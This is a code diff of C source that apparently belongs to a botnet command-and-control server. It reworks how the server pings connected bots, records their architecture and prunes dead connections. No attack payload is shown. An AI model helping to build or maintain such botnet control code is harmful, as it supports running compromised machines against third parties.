@@ -65,18 +65,12 @@ void* handle_bot(void* arg) {
                 break;
             }
             buffer[len] = 0;
-            
             if (strncmp(buffer, "ping", 4) == 0) {
                 char pong[64];
                 snprintf(pong, sizeof(pong), "pong %s", bots[bot_index].arch);
-                if (send(bot_socket, pong, strlen(pong), MSG_NOSIGNAL) < 0) {
-                    if (errno != EAGAIN && errno != EWOULDBLOCK && errno != EINTR) {
-                        break;
-                    }
-                }
+                send(bot_socket, pong, strlen(pong), MSG_NOSIGNAL);
                 continue;
             }
-            
             int valid = 1;
             for (ssize_t i = 0; i < len; i++) {
                 if ((unsigned char)buffer[i] < 0x09 || ((unsigned char)buffer[i] > 0x0D && (unsigned char)buffer[i] < 0x20) || (unsigned char)buffer[i] > 0x7E) {
@@ -259,7 +253,8 @@ void* ping_bots(void* arg) {
                 bots[i].is_valid = 0;
                 continue;
             }
-            
+            char ipbuf[32];
+            inet_ntop(AF_INET, &bots[i].address.sin_addr, ipbuf, sizeof(ipbuf));
             int res = send(bots[i].socket, "ping", 4, MSG_NOSIGNAL | MSG_DONTWAIT);
             if (res < 0) {
                 if (errno == EAGAIN || errno == EWOULDBLOCK || errno == EINTR) {
@@ -273,34 +268,36 @@ void* ping_bots(void* arg) {
                 bots[i].is_valid = 0;
                 continue;
             }
-            
             ev.events = EPOLLIN;
             ev.data.fd = bots[i].socket;
             epoll_ctl(epoll_fd, EPOLL_CTL_ADD, bots[i].socket, &ev);
         }
-        
         int nfds = epoll_wait(epoll_fd, events, bot_count, 2000);
         for (int n = 0; n < nfds; n++) {
             int fd = events[n].data.fd;
             memset(pongbuf, 0, sizeof(pongbuf));
             ssize_t ponglen = recv(fd, pongbuf, sizeof(pongbuf)-1, MSG_DONTWAIT);
-            for (int i = 0; i < bot_count; i++) {
-                if (bots[i].socket == fd && bots[i].is_valid) {
-                    if (ponglen > 0 && strncmp(pongbuf, "pong ", 5) == 0) {
+            if (ponglen > 0 && strncmp(pongbuf, "pong ", 5) == 0) {
+                for (int i = 0; i < bot_count; i++) {
+                    if (bots[i].socket == fd && bots[i].is_valid) {
                         if (current_pos != i) {
                             bots[current_pos] = bots[i];
                         }
                         current_pos++;
-                    } else {
+                        break;
+                    }
+                }
+            } else {
+                for (int i = 0; i < bot_count; i++) {
+                    if (bots[i].socket == fd && bots[i].is_valid) {
                         close(bots[i].socket);
                         bots[i].is_valid = 0;
+                        break;
                     }
-                    break;
                 }
             }
             epoll_ctl(epoll_fd, EPOLL_CTL_DEL, fd, NULL);
         }
-        
         for (int i = 0; i < bot_count; i++) {
             if (!bots[i].is_valid) continue;
             int found = 0;
@@ -322,7 +319,6 @@ void* ping_bots(void* arg) {
                 }
             }
         }
-        
         bot_count = current_pos;
         pthread_mutex_unlock(&bot_mutex);
         sleep(6); 
